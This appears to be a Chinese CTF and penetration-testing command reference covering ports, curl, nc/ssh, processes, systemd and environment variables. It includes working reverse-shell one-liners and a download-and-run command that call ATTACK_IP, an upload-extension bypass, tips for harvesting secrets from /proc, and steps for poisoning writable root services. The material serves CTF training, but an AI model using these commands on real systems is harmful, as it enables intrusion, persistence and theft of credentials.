## [g-net] 网络与监听——端口、HTTP 请求、nc 与 ssh

### [port-listen] 端口与监听查看 | easy | 端口;netstat;ss;lsof | ss
> 判断开了哪些服务、谁在监听，是内网探测和信息收集的基本功；注意 ss/netstat 的参数差异。

#### 这个条目的作用
拿到 shell 或任意命令执行后，第一件事往往不是找 flag，而是摸清这台机器上**开了什么端口、跑了什么服务**。端口监听信息能告诉你：有没有 MySQL/Redis 未授权、有没有内网 Web 服务、哪个进程占着关键端口——这就是内网横向移动和提权的起点。本条目教会你用 `ss`、`netstat`、`lsof` 三种工具把监听状态看得明明白白。

#### 前置条件
- 已经获得目标机器上的命令执行权限（反弹 shell、RCE、Webshell 都行）
- 知道自己是普通用户还是 root（root 能看到所有进程，普通用户只能看到部分）
- 机器上至少装了 `ss`、`netstat`、`lsof` 中的一种

#### 第 1 步：用 ss 看监听中的 TCP 端口（首选）
`ss` 是现代 Linux 的标准命令，速度比 netstat 快，参数也更直观：

```bash
ss -tlnp
```

逐字母拆解：`-t` 只看 TCP，`-l` 只显示处于监听（LISTEN）状态的端口，`-n` 直接用数字显示端口和 IP（不做域名解析，更快），`-p` 显示占用进程的 PID 和名字。

**预期结果**：形如 `LISTEN 0 128 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=1234,fd=6))` 的行——表示 80 端口由 PID 1234 的 nginx 监听。

**如果不行**：提示 `ss: command not found`，说明没装 iproute2，跳到第 2 步用 netstat。

#### 第 2 步：加 UDP，看全部连接
监听端口只是冰山一角，已建立的连接同样重要（比如反连回来的 shell）：

```bash
ss -tunap
```

`-u` 加上 UDP，`-a` 表示 all——监听的和已建立的都显示。内网渗透时用 `ss -tunap` 一次看全，比 `-tlnp` 信息量大得多。

#### 第 3 步：老机器用 netstat 兜底
没有 ss 的旧系统（不少容器镜像和 CentOS 6 就是如此）用 netstat：

```bash
netstat -tlnp
netstat -ano          # Windows 上常用，CTF 里如果拿下的是 Windows 靶机用它
```

注意 netstat 的 `-p` 在普通用户下可能看不到进程名（显示为空或要求 root），这是正常现象，别以为是出错。

#### 第 4 步：用 lsof 按端口反查进程
知道端口想查"谁占的"，或知道进程想查"它连了谁"，用 lsof：

```bash
lsof -i :8080         # 谁占用了 8080 端口
lsof -i               # 全部网络连接
lsof -p 1234          # 某进程打开的所有文件/连接（PID 换成第 1 步查到的）
```

`lsof -i :8080` 里端口可以不带冒号吗？不行，`-i :端口` 的冒号是固定语法，写成 `lsof -i 8080` 会被当成别的解析。

#### 第 5 步：没有网络工具时读 /proc（容器保命招）
Docker 容器为了瘦身经常连 ss、netstat 都没有，但 `/proc` 文件系统总在：

```bash
cat /proc/net/tcp
grep -i listen /proc/net/tcp
ls /proc/*/fd 2>/dev/null | head -20     # 看各进程打开了哪些文件描述符
```

**重点**：`/proc/net/tcp` 里端口是**十六进制**！`0100` 其实是 256（0x0100 = 256），换算用 `printf '%x' 256`（10 进制转 16 进制）或 `printf '%d' 0x0100`（16 进制转 10 进制）。`01BB` = 443，`0050` = 80，记住这俩常用值能省很多换算时间。

#### 第 6 步：用进程反查服务
有时端口工具全被裁剪，但 `ps` 还在——反过来从进程名找服务：

```bash
ps aux | grep -iE 'nginx|apache|mysql|redis|ssh'
```

结合第 5 步：`cat /proc/PID/cmdline | tr '\0' ' '` 能看某个进程的完整启动命令行（参数里经常带配置路径甚至密码）。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| `ss: command not found` | 没装 iproute2 | 用 `netstat -tlnp`；再没有就读 `/proc/net/tcp` |
| `-p` 看不到进程名 | 普通用户权限不足 | 提权后用 root 重跑，或从 `ps aux` 按端口反查 |
| 端口显示 `0100` 之类的数字 | /proc/net/tcp 用十六进制 | `printf '%d' 0x0100` 换算成 256 |
| 只看到 22/80 这样的常见端口 | 服务绑定了别的网卡（如 127.0.0.1） | 注意 `Local Address` 列，`127.0.0.1:3306` 意味着只有本机能连——这正是内网嗅探/隧道要打的点 |
| 容器里 ls /proc/*/fd 全是权限错误 | 非 root 看不到别的进程 fd | 加 `2>/dev/null`，或转用 /proc/net/tcp |

#### 实战要点
- 内网信息收集固定动作：`ss -tunap` 全量记一遍监听端口，对照常见服务端口表（3306 MySQL、6379 Redis、6379 也可能被改、27017 MongoDB、9200 Elasticsearch）找未授权。
- 绑定 `127.0.0.1` 的端口**不代表没用**——通过 SSH 隧道或靶机上的代理就能访问，是内网渗透的经典入口。
- 拿到 webshell 先跑第 1+6 步：监听端口 + 进程清单互相印证，能快速发现隐藏的数据库和管理面板。
- 记下 `LISTEN` 里 `0.0.0.0` 与 `127.0.0.1` 的区别：前者对外暴露，后者仅本机，判断目标面大小。
- 时间紧就用一个组合拳：`ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp`。

### [curl-wget] curl 与 wget 常用参数 | easy | curl;wget;http | 请求
> curl 是 CTF 最常用 HTTP 客户端：发 GET/POST、带 Cookie/Header、跟跳转、保存响应一步到位。

#### 这个条目的作用
`curl` 是你在 CTF 里打交道最多的命令，没有之一。无论是访问隐藏路由、提交 POST 表单、带 Cookie 保持登录、伪造请求头绕过 WAF，还是把远程文件拉回来，全靠它。`wget` 则擅长批量下载。本条目把 curl 的高频参数按场景拆开讲，保证照抄就能用。

#### 前置条件
- 目标机器装了 curl（几乎所有 Linux 发行版都有；没有就 `apt install curl` 或 `yum install curl`）
- 知道目标 URL（http:// 或 https:// 都行）
- 理解 HTTP 基本概念：GET/POST、请求头、响应头、Cookie

#### 第 1 步：最基础的 GET 请求
```bash
curl -s http://target/          # 静默模式，不显示进度条，只输出响应体
curl -sI http://target/         # -I 只取响应头（看 Server、Location、Set-Cookie 等信息）
curl -s http://target/ -o out.html   # 把响应体保存成文件
```

**预期结果**：第一行输出网页 HTML；`-sI` 输出 HTTP 状态行 + 一堆响应头；`-o` 后终端无输出，内容进了 `out.html`（用 `cat out.html` 确认）。

**如果不行**：`Could not resolve host` 说明域名/网络问题；`Connection refused` 说明端口没开。先确认目标可达。

#### 第 2 步：跟随跳转与忽略证书
```bash
curl -sL http://target/              # -L 自动跟随 30x 跳转（不跟的话只看到 302 空壳）
curl -sk https://target/             # -k 忽略证书校验（自签名证书的 https 站点必加）
curl -sLk http://target/             # 组合：跟随跳转 + 忽略证书
```

CTF 里目标经常是 https 自签名证书，不加 `-k` 会直接报 `SSL certificate problem` 拒绝请求——**遇到 https 先无脑 `-k`**。

#### 第 3 步：POST 提交数据（表单和 JSON）
```bash
curl -s -X POST http://target/api/login -d 'user=admin&pass=123456'
curl -s -d 'user=admin&pass=123456' http://target/api/login    # -d 本身就把方法改成 POST，可省略 -X
curl -s -d '{"a":1}' -H 'Content-Type: application/json' http://target/api
curl -s --data-urlencode 'cmd=whoami' http://target/rce
```

**最关键的一条经验**：`-d` 参数会自动把你的请求方法变成 POST，所以 `-X POST` 经常可以不写。但**只写 `-d` 不写 `-H 'Content-Type: application/json'` 时，数据会按表单格式（application/x-www-form-urlencoded）发送**——发 JSON 必须手动加这行头。

**如果不行**：提交 JSON 报 400，检查两件事：1）有没有加 `Content-Type: application/json`；2）JSON 里的引号有没有被 shell 吃掉——外层用单引号包住整体，内部用双引号。

#### 第 4 步：自定义请求头
```bash
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://target/admin    # 伪造内网来源，绕过 IP 白名单类校验
curl -s -H 'User-Agent: Mozilla/5.0' http://target/            # 伪装浏览器 UA（有的站点拦 curl 默认 UA）
curl -s -H 'Referer: http://target/admin' http://target/flag   # 伪造来源页
curl -s -H 'Authorization: Bearer eyJhbGciOi...' http://target/api/user
```

每个 `-H` 加一个头，可以写多个 `-H` 叠加。CTF 考点：很多"仅内网访问"的接口靠 `X-Forwarded-For` 或 `X-Real-IP` 判断，直接伪造 `127.0.0.1` 就过了。

#### 第 5 步：Cookie 与会话保持
```bash
curl -s -b 'session=abc123' http://target/private          # -b 发送 Cookie
curl -s -c cookies.txt http://target/login                 # -c 把服务器 Set-Cookie 存到文件
curl -s -b cookies.txt http://target/private               # 之后用 -b 读文件带上
curl -s -b 'session=abc123' -H 'Cookie: other=1' http://target/   # 注意 -H Cookie 和 -b 别重复传同一字段
```

登录型题目标准流程：先用 `-c cookies.txt` 登录一次，存下会话；后续所有请求都加 `-b cookies.txt`，保持登录态。

#### 第 6 步：上传文件与略高级功能
```bash
curl -s -F 'file=@/etc/passwd' http://target/upload      # multipart 上传文件，@ 后面是本地路径
curl -s -F 'file=@./shell.php;filename=1.png' http://target/upload   # 重命名上传的文件（绕过扩展名检测常见手法）
curl -s -u admin:admin http://target/                    # Basic Auth 认证
curl -s -x http://proxy:8080 http://target/              # 走 HTTP 代理（Intercept 抓包时用）
curl -s http://target/file -r 0-1023                     # 范围请求，只取前 1024 字节（读大文件或探测偏移）
curl -s -o /tmp/linpeas.sh https://github.com/.../linpeas.sh   # 下载工具到目标机
```

#### 第 7 步：wget 与批量请求
```bash
wget -q http://target/file.zip                  # -q 静默下载
wget -r -np http://target/dir/                  # 递归下载整个目录（爬站点资源，-np 不上升到上级目录）
wget --post-data='a=1' http://target/login      # POST 提交
for i in $(seq 1 100); do curl -s -d "id=$i" http://target/get | grep -o 'flag{.*}'; done   # 批量爆破
```

`wget -r` 适合把整个站点的 JS/CSS/图片镜像下来做前端分析；批量场景用 for 循环 + curl + grep 一行流。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| `SSL certificate problem` | https 证书不被信任 | 加 `-k` 忽略校验 |
| 页面只显示 302，没内容 | 没有跟随跳转 | 加 `-L` |
| JSON 提交报 400 | 缺 `Content-Type: application/json` | 补上 `-H 'Content-Type: application/json'` |
| 中文/特殊字符被截断或报错 | 参数未 URL 编码 | 用 `--data-urlencode 'key=值'` 自动编码 |
| 加了 `-X POST` 却收到 GET 效果 | 某些场景 `-X` 与 `-d` 冲突 | 直接只用 `-d`，别再写 `-X POST` |
| 上传的文件名变了或被拒 | 服务端校验扩展名 | `-F 'file=@x.php;filename=x.png'` 绕过，配合解析漏洞 |
| Could not resolve host | DNS 或网络不通 | `curl -v` 看详细过程；检查 URL 拼写 |

#### 实战要点
- 排查请求问题第一招：`curl -v` 打印完整请求/响应头，比 `-s` 默认的静默输出有用十倍。
- 读文件类题目：`-r 0-1023` 配合循环可以枚举目标文件内容（如日志、源码）。
- 内网探测：用 curl 对 `ss -tlnp` 看到的每个端口发 `curl -s http://127.0.0.1:端口/` 探活，快速定位管理面板。
- WebShell 上线后，反弹 shell 常用 `curl ATTACK_IP:8080/shell` 把恶意文件拉下来执行。
- 所有 `-H` 可以叠加多个；`-b` 与 `-H 'Cookie:'` 二选一，避免重复传同名字段被服务端取到空值。

### [nc-ssh] nc 与 ssh：反弹、监听、转发 | medium | nc;ssh;端口转发;跳板 | netcat
> nc 是网络瑞士军刀（收发任意 TCP/UDP），ssh 是远程管理标配；两者组合覆盖反弹 shell、生传文件、隧道三个高频场景。

#### 这个条目的作用
`nc`（netcat）和 `ssh` 是网络渗透的两件核心武器。`nc` 能监听端口、连接端口、传文件、弹 shell——拿到 RCE 后最快建立稳定控制通道的方式就是反弹 shell；`ssh` 不只是登录工具，它的 `-L/-R/-D` 端口转发让你能从攻击机打进内网、把内网服务"搬"出来。本条目把三个高频场景——反弹 shell、文件传输、SSH 隧道——逐步讲透。

#### 前置条件
- 一台你能控制的攻击机（本机或 VPS），有公网 IP 或与靶机互通
- 靶机上能执行命令（RCE/webshell/shell 均可）
- 知道靶机出网方向的 IP：靶机**往外连**你的攻击机（反弹 shell 靠这个方向），或者你**往内连**靶机（正向连接靠这个方向）

#### 第 1 步：nc 的基础监听与连接
```bash
nc -lvnp 4444            # 在攻击机监听 4444 端口
nc target 4444           # 连接目标端口，连上后可以直接收发数据
nc -u -lvnp 53           # UDP 监听（UDP 反弹更难被检测，某些场景用）
timeout 1 nc -zv target 80   # 端口连通性探测（-z 不发送数据，-v 输出结果），1 秒超时
```

`-l` 监听、`-v` 详细输出、`-n` 不做 DNS 解析、`-p` 指定端口。监听方按完 `nc -lvnp 4444` 会"卡住"等待连接——这是正常的，别关掉。

**如果不行**：`nc: command not found` 说明没装 nc。Debian 系试 `apt install netcat-openbsd`，或直接用第 4 步的 python 反弹，不依赖 nc。

#### 第 2 步：反弹 shell（靶机主动连攻击机）
攻击机先执行第 1 步的 `nc -lvnp 4444` 挂起监听，然后在靶机上执行下面任一命令（按兼容性从高到低排）：

```bash
# 方案 A：python 版（兼容性最好，推荐）
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACK_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 方案 B：bash /dev/tcp 版（不依赖 nc，但依赖 bash）
bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1

# 方案 C：nc 带 -e 版（需要 nc 支持 -e）
nc -e /bin/sh ATTACK_IP 4444

# 方案 D：mkfifo 万能版（既无 -e 也无 python 时）
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACK_IP 4444 > /tmp/f
```

**预期结果**：攻击机的 nc 窗口出现 `connect to [ATTACK_IP] from ...` 提示，随后可以直接输入 `id`、`ls` 等命令，就像在本机 shell 一样。

**如果不行**：靶机装的是精简版 nc（`nc -e` 报 `invalid option`），就换方案 A 或 B。靶机没有 python3 也没有 bash？试 `sh -i >& /dev/tcp/ATTACK_IP/4444 0>&1`，或检查靶机是否用 `/bin/busybox nc`。

**ATTACK_IP 注意**：填攻击机的**公网/可达 IP**，不是靶机的 IP。反弹的方向是"靶机 → 攻击机"。

#### 第 3 步：nc 传文件
```bash
# 攻击机（接收方）监听，把收到的数据写成文件：
nc -lvnp 9999 > received.zip
# 靶机（发送方）把本地文件发出去：
nc ATTACK_IP 9999 < shell.php
```

或反过来，攻击机发文件给靶机：

```bash
# 靶机先监听：
nc -lvnp 9999 > /tmp/shell.php
# 攻击机发送：
nc target 9999 < shell.php
```

传完后两端分别按 `Ctrl+C` 结束。传大文件容易中断，建议先 `gzip -9` 压缩再传。

#### 第 4 步：升级为交互式 shell
反弹回来的 shell 往往是残缺的（没有历史记录、Ctrl+C 直接退出、没有 tab 补全），升级它：

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 然后按 Ctrl+Z 挂起，在本机执行：
stty raw -echo; fg
# 最后（本机）：
export TERM=xterm
```

升级后按 Ctrl+C 不会杀掉 shell，可以正常使用 vim、top 等交互程序——内网渗透的必备操作。

#### 第 5 步：SSH 基础与密钥
```bash
ssh user@host                          # 基本登录（首次会问指纹，输 yes）
ssh -i id_rsa user@host                # 密钥登录（私钥权限必须 600，否则报 permission too open）
ssh-keygen -t ed25519 -f mykey -N ''   # 生成免密码密钥对（-N '' 表示空口令）
ssh-copy-id user@host                  # 把公钥装到远端 authorized_keys，之后免密登录
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host   # 跳过指纹确认（脚本/扫描场景）
```

**如果不行**：`Permissions 0644 for 'id_rsa' are too open`——立刻 `chmod 600 id_rsa`，这是 SSH 安全策略强制要求。私钥被目标机器捡到拿来登录其他机器时，同样先 chmod 600。

#### 第 6 步：SSH 三种端口转发（内网渗透核心）
```bash
# 本地转发：把"远端机器能看到"的 80 端口，映射到本机 8080
ssh -L 8080:127.0.0.1:80 user@host
# 之后浏览器访问 http://127.0.0.1:8080 就等于访问"从 host 视角看到的 127.0.0.1:80"

# 远程转发：把本机的 80 转发到远端，让远端可以访问本机服务
ssh -R 8080:127.0.0.1:80 user@host

# 动态转发：本机开一个 SOCKS5 代理，所有走这个代理的流量都从 host 出网
ssh -D 1080 user@host
# 本机配合：curl -x socks5://127.0.0.1:1080 http://internal-service/

# 跳板机 ProxyJump：先跳 bastion 再进 target（一层层打进内网）
ssh -J jump@bastion user@target
```

**理解本地转发 `-L 8080:127.0.0.1:80`**：格式是 `本地端口:目标地址:目标端口`，其中"目标地址"是**从 SSH 服务器（host）的视角**解析的。所以 `-L 8080:127.0.0.1:3306` 暴露的是 host 本机的 MySQL——即使它只绑定了 127.0.0.1，你也能通过本地 8080 端口访问。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| nc 监听后敲命令没反应 | 反弹的 shell 还没连上，或连错端口 | 检查靶机命令里的 ATTACK_IP/端口；`nc -lvnp` 要一直挂着 |
| 反弹回 shell 但立刻断 | 靶机 python/nc 兼容问题 | 换方案 A/B/D；优先 python 版 |
| `nc: invalid option -- 'e'` | OpenBSD 版 nc 默认不带 -e | 用 mkfifo 万能版或 bash /dev/tcp |
| 私钥权限 too open | 私钥文件权限大于 600 | `chmod 600 id_rsa` |
| Host key verification failed | 指纹不匹配（换机/重装系统常见） | 脚本场景用 `-o StrictHostKeyChecking=no` |
| 隧道通了但连不上目标服务 | -L 里目标地址解析错了 | 记住"目标地址按 SSH 服务器视角解析"：转发它本机服务就写 127.0.0.1 |
| 反弹 shell 无 tty，vim/top 用不了 | 拿的是非交互 shell | 第 4 步 pty 升级 + stty raw |

#### 实战要点
- 反弹 shell 优先级：python3 版 > bash /dev/tcp > mkfifo > nc -e。不确定环境就先把 python 版跑一遍。
- 拿到 shell 第一件事：`python3 -c 'import pty; pty.spawn("/bin/bash")'` 升级交互式，再 `stty raw -echo; fg` 补全能力。
- 内网渗透三件套：`ssh -L` 转发数据库、`ssh -D` 开 SOCKS5 全流量代理、`ssh -J` 串跳板。攻陷一台内网机器后，把它的 SSH 当成通往内网的"路由器"。
- nc 传文件先压缩：`gzip -c file | nc ...` 减少中断概率；Windows 靶机可用 `certutil -urlcache -f http://...` 或 powershell 下载替代。
- 反弹 shell 的方向永远是**靶机连攻击机**——靶机在内网出不去时，改为攻击机 `ssh`/`nc` 正向连靶机的其他入口。

## [g-proc] 进程与系统——ps/top、systemctl、环境变量、定时任务

### [ps-top] 进程查看与控制 | easy | 进程;ps;top | 进程管理
> ps 是静态快照，top 是动态实时；先看进程再决定杀谁、提权对象是谁。

#### 这个条目的作用
拿到 shell 后，`ps` 和 `top` 是了解这台机器"正在跑什么"的窗口：哪个服务以 root 身份运行、哪个可疑进程藏着 flag、哪个进程占满了 CPU 拖慢题目。`ps` 是静态快照（拍一张看一次），`top` 是动态刷新（持续观察 CPU 变化）。本条目教你快速看懂进程列表并控制进程。

#### 前置条件
- 已有目标机器上的命令执行权限
- 知道 `ps`、`top` 属于 procps 包（几乎必装；没有就 `apt install procps`）

#### 第 1 步：查看全部进程（ps aux）
```bash
ps aux
```

参数含义：`a` 显示所有用户的进程，`u` 以用户友好格式显示（含 CPU/内存占用），`x` 包含没有控制终端的进程（守护进程）。

**预期结果**：表头 `USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND`，下面每行一个进程。重点看 `USER`（谁在跑，root 进程是提权目标）和 `COMMAND`（跑的是什么）。

#### 第 2 步：过滤目标进程
```bash
ps aux | grep -i php          # 只看含 php 的进程（-i 忽略大小写）
ps aux | grep -v grep         # grep 自己也匹配"grep"两个字，把那个进程行去掉
ps aux | grep -iE 'php|mysql|redis'    # 多关键字用 -E 扩展正则
ps -ef                        # 另一种标准格式（看 PPID 父子关系更方便）
ps -e -o pid,ppid,user,args   # 自定义列：只输出 PID、父 PID、用户、命令行
```

**如果不行**：`grep php` 结果里老带一行 `grep php` 自己——这是 grep 匹配到了自身命令行，加 `grep -v grep` 过滤（或 `ps aux | grep '[p]hp'` 用字符类技巧）。

#### 第 3 步：按 PID 查单进程与父子关系
```bash
ps -fp 1234                        # 按 PID 查（-f 完整格式）
pstree                             # 进程树，看父子关系（谁启动了谁）
ps -ef | awk '$2==1234 || $3==1234'    # 找 PID 1234 及其全部子进程
ls -l /proc/1234/exe               # 进程 1234 实际执行的文件路径
cat /proc/1234/cmdline | tr '\0' ' '    # 进程的完整启动参数
cat /proc/1234/environ | tr '\0' '\n'   # 进程的环境变量（常藏密钥！）
```

`/proc/PID/environ` 是提权与找 flag 的高频点：很多题目把 `FLAG=xxx` 塞进某个进程的环境变量里，`tr '\0' '\n'` 把 NUL 分隔符转成换行才能读。

#### 第 4 步：top 实时监控
```bash
top
```

进去后是实时刷新界面（每 3 秒一次）。快捷键：
- `P` 按 CPU 占用排序（大写 P）
- `M` 按内存占用排序（大写 M）
- `k` 杀掉高亮进程（输入 PID 再回车，会问信号，默认 15）
- `q` 退出

**预期结果**：第一行是负载与运行时间，往下是各进程实时 CPU/内存。`top -b -n 1` 可以在脚本里输出一帧后退出（非交互模式）：

```bash
top -b -n 1 | head -20      # 非交互打印一次完整快照
```

#### 第 5 步：控制进程（kill）
```bash
kill -15 PID        # SIGTERM，优雅退出（让进程自己清理）
kill -9 PID         # SIGKILL，强杀（立即终止，无法拦截）
killall nginx       # 按名字杀所有匹配进程
pkill -f 'python.*server'   # 按命令行匹配杀
sleep 31337 &       # 后台挂一个长进程（有的题考"超长时 flag 释放"或占位）
```

**什么时候用哪个**：正常情况下先 `-15` 给它善后机会；进程卡死、杀不掉、或急着清场时 `-9`。CTF 里如果某个进程拖慢了系统，`kill -9` 直接解决。

#### 第 6 步：观察动态变化（watch）
```bash
watch -n1 'ps aux | grep -v grep | grep flag'    # 每秒刷新一次，盯 flag 进程是否出现
watch -n1 'ss -tlnp'                              # 每秒看端口变化
```

`watch` 每隔 N 秒重跑一次引号里的命令并全屏刷新，适合盯着"某进程会不会周期性出现"（比如定时任务启动的进程）。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| `grep` 自己出现在结果里 | grep 匹配到了自身 | 加 `grep -v grep` 或用 `grep '[p]hp'` |
| `ps aux` 报参数错误 | 那是 BSD 语法，某些精简版 ps 不支持 | 用 `ps -ef` 或 `ps -e` |
| top 里 `k` 后杀不掉 | 权限不足或进程是内核线程 | 提权后再杀；内核线程无法由用户层杀 |
| CMS 页面 502 | 后端 PHP-FPM 进程挂了 | `ps aux \| grep -i php-fpm`，`kill` 后让服务管理器重启 |
| /proc/PID/environ 是乱码 | NUL 分隔未转换 | `tr '\0' '\n' < /proc/PID/environ` |
| 进程列表刷屏 | 进程太多 | `ps aux \| head` + grep 过滤组合使用 |

#### 实战要点
- 拿到 shell 三件事：`ps aux | grep -iE 'flag|server|mysql|redis'`、`id`、`sudo -l`——进程清单能直接暴露藏 flag 的守护进程和跑着的高权限服务。
- 高权限进程是提权线索：看到 root 跑的脚本/服务，回头查它的启动脚本是否可写（配合 cron/服务条目）就是提权链。
- `ps aux` 的 `%CPU` 列：某进程长期 100% 往往是题目特意跑的（比如每 5 秒生成一次 flag），配合 `watch` 盯它。
- 查进程真实路径 `ls -l /proc/PID/exe` 能看到伪装进程的真实程序（比如把名字改成 `sshd` 的恶意程序还是会指向真实路径）。
- 反弹 shell 后若终端卡死，`Ctrl+Z`、`stty raw -echo; fg` 可恢复；真不行就再弹一次，没必要跟坏终端死磕。

### [sysctl-service] systemctl 服务管理 | medium | systemctl;服务;开机 | service
> 管理 systemd 服务：启动/停止/重启/开机自启，以及看服务日志与单元文件，服务配置错误本身也是常见 misconfig。

#### 这个条目的作用
`systemd` 是现代 Linux 的服务管家：nginx、mysql、ssh 这些服务都由它拉起和管理。CTF 里掌握 `systemctl` 的用处：重启被搞挂的服务让题目恢复、查看服务日志找报错路径、分析服务单元文件（ExecStart 指向可写脚本 = 提权机会）、用 timer 发现隐藏的定时任务。本条目把服务管理和日志查看完整过一遍。

#### 前置条件
- 目标机器用的是 systemd（用 `ps -p 1` 确认，PID 1 是 `/sbin/init` 或 `systemd` 即支持）
- 有 root 或 sudo 权限才能 start/stop/restart（status 和日志普通用户可看）
- 知道服务名（如 nginx、mysql、ssh：注意 CentOS 上 SSH 服务名是 `sshd`，Ubuntu 是 `ssh`）

#### 第 1 步：确认是不是 systemd 系统
```bash
ps -p 1 -o comm=
```

输出 `systemd` 说明走 systemctl；输出 `bash`、`nginx` 之类说明是容器（PID 1 是应用本身），没有 systemd，服务管理命令会报 `System has not been booted with systemd as init system (PID 1)`。

**如果不行**：容器里别硬试 systemctl，改用手动方式：直接执行服务的可执行文件，或用 `service 服务名 start`（部分容器装了 sysvinit 兼容层）。

#### 第 2 步：看服务状态
```bash
systemctl status nginx
```

**预期结果**：一段输出包含：`Loaded`（单元文件路径）、`Active: active (running)` （运行中）或 `failed`（挂了）、`Main PID`、以及**最后几行日志**（journal 片段）。这是排查"为什么挂了"的第一站。

**如果不行**：`Unit nginx.service could not be found`——服务名不对或没装。用 `systemctl list-units --type=service` 列出全部服务找真名。

#### 第 3 步：启动/停止/重启服务
```bash
systemctl start nginx
systemctl stop nginx
systemctl restart nginx
systemctl reload nginx        # 热重载配置（nginx 改完配置用这个，不断连接）
```

CTF 场景：改完 nginx 配置或把 PHP-FPM 搞挂了，`systemctl restart` 拉回来；但**停掉题目服务可能导致题目状态丢失**，操作前想清楚是否需要。

#### 第 4 步：开机自启管理
```bash
systemctl enable --now nginx     # 开机自启 + 立即启动（组合拳最常用）
systemctl enable nginx           # 只设开机自启
systemctl disable nginx          # 取消开机自启
systemctl is-enabled nginx       # 查看是否已设自启（输出 enabled/disabled）
systemctl list-unit-files | grep enabled   # 全系统开机自启清单
```

`--now` 是个甜点：enable 和 start 一步到位，省一条命令。开清单时配合 grep 能快速发现可疑的自启服务（比如 `backdoor.service`）。

#### 第 5 步：查看与分析服务单元文件（提权重点）
```bash
systemctl cat nginx             # 直接打印单元文件内容
systemctl cat nginx | grep ExecStart    # 看服务真正执行的命令
systemctl edit nginx            # 编辑 override 文件（会打开编辑器）
```

**提权场景**：`ExecStart=/opt/scripts/run.sh` 如果这个 `/opt/scripts/run.sh` 是当前用户可写的，就能往里面塞 payload，等服务重启或开机时以 root 执行。

```bash
# 检查可疑服务单元里指向的脚本是否可写：
systemctl cat 服务名 | grep -E 'ExecStart|ExecStartPre'
ls -la /opt/scripts/run.sh
```

#### 第 6 步：看服务日志
```bash
journalctl -u nginx -n 50        # nginx 服务最近 50 行日志（-u 指定服务，-n 行数）
journalctl -u nginx -f           # 实时跟踪该服务日志（-f follow，类似 tail -f）
journalctl -n 100                # 全系统最近 100 行
journalctl -xeu nginx            # 组合：-x 解释信息 -e 跳到末尾 -u 指定服务
```

日志里的报错常带**绝对路径**（PHP 报错、配置文件路径），直接决定后续文件读取目标。日志被清空的题目（`journalctl --vacuum-time=1s` 之类）提示你可能要配合其他信息源。

#### 第 7 步：systemd timer（cron 的 systemd 版）
```bash
systemctl list-timers                     # 列出所有定时器（下次触发时间 + 关联的 .service）
systemctl list-timers --all               # 含已失效的
systemctl cat 某timer名字.timer           # 看定时器的单元文件（OnCalendar= 决定触发时间）
```

systemd timer 是 cron 的现代替代品，很多题目把"root 定时执行脚本"写在 timer 里而不是 crontab——检查顺序：`list-timers` → `cat xxx.timer` → 看它触发的 `.service` 的 ExecStart 是否可写。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| `System has not been booted with systemd` | 容器环境没有 systemd | 不用 systemctl；手动执行或 `service` 兼容层 |
| `Unit xxx.service could not be found` | 服务名错/没装 | `systemctl list-units --type=service` 找真名 |
| status 显示 `failed` | 服务启动时崩溃 | `journalctl -u 服务名 -n 50` 看崩溃原因 |
| start 报 `Permission denied` | 非 root | `sudo systemctl start xxx` 或提权 |
| 改了配置 restart 后还是旧的 | 服务没吃新配置 | 用 `reload`；nginx 类确认 `-t` 测试配置语法 |
| timer 到了时间不触发 | 单元文件语法错或服务缺失 | `systemctl cat timer名` 检查 OnCalendar 与关联 service |

#### 实战要点
- 提权审计顺序：`systemctl list-unit-files | grep enabled` → 逐个 `systemctl cat` 看 ExecStart → 检查脚本可写性。可写的 root 服务脚本 = 稳定提权。
- 容器没 systemd 是常态（PID 1 是 `nginx` 或 `bash`），别浪费时间硬试 systemctl，直接看进程和 crontab。
- `systemctl stop` 停掉的是整个服务，如果题目服务里存着 flag 生成逻辑，停掉后可能拿不到——优先用 `kill PID` 定向处理。
- `systemctl reload` 不断连接，配置热更新场景比 restart 更优；但改 ExecStart 这类启动参数必须用 restart 或 daemon-reload。
- timer 与 cron 双线排查：先 `crontab -l` 和 `/etc/crontab`，再看 `systemctl list-timers`，别漏掉任何一条 root 定时执行路径。

### [env-cron] 环境变量与定时任务 | easy | 环境变量;cron;内核 | env;crontab
> 环境变量里藏密钥、crontab 里有可写脚本、uname 决定内核版本——三个都是 CTF 高频信息点。

#### 这个条目的作用
一个小条目覆盖三个高频信息点：**环境变量**（`env`）里经常藏着 flag、数据库密码、API Key；**crontab** 里 root 定时执行的脚本是可写投毒提权的经典入口；**uname** 一查内核版本就能对表找已知提权漏洞（Dirty Pipe、OverlayFS 等）。拿 shell 后这三样基本是必查项目。

#### 前置条件
- 已有命令执行权限
- 知道环境变量的基本概念（键值对，如 `PATH=/usr/bin`）
- 知道 crontab 五段格式：分 时 日 月 周

#### 第 1 步：查看全部环境变量
```bash
env
printenv        # 等价命令
printenv SECRET # 只看单个变量（SECRET 换成实际变量名）
```

**预期结果**：一长串 `KEY=value` 行，常见的有 `PATH=...`、`HOME=...`、`USER=...`。**重点扫描**：名字含 `FLAG`、`KEY`、`PASS`、`TOKEN`、`SECRET` 的变量——很多题目直接把 flag 塞进环境变量：

```bash
env | grep -iE 'flag|key|secret|pass'
```

**如果不行**：`env` 的空行很多但啥都没有——试试第 2 步从进程环境里翻。

#### 第 2 步：翻特定进程的环境变量
```bash
cat /proc/self/environ | tr '\0' '\n'          # 当前进程环境
cat /proc/1/environ | tr '\0' '\n'             # PID 1（容器主进程）的环境——容器挂载的 secrets 常在这
for p in /proc/[0-9]*/environ; do echo "== $p"; tr '\0' '\n' < $p 2>/dev/null; done | grep -iE 'flag|key|pass'
```

